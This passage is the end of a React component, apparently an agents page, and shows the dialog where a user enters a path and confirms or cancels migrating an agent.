              onKeyDown={(e) => { if (e.key === "Enter") { void (async () => { if (await runMigrateAgent(migratePath)) setConfirmMigrate(false); })(); } }}
              placeholder={t("agents.migrate_path_placeholder")}
              className="mb-3 text-sm font-mono"
            />
            <DialogFooter>
              <Button variant="ghost" size="sm" onClick={() => setConfirmMigrate(false)} disabled={!!dangerBusy}>{t("agents.detail_cancel")}</Button>
              <Button variant="destructive" size="sm" onClick={async () => { if (await runMigrateAgent(migratePath)) setConfirmMigrate(false); }} disabled={!!dangerBusy}>{t("agents.migrate")}</Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      )}
    </PageContainer>,
  );
})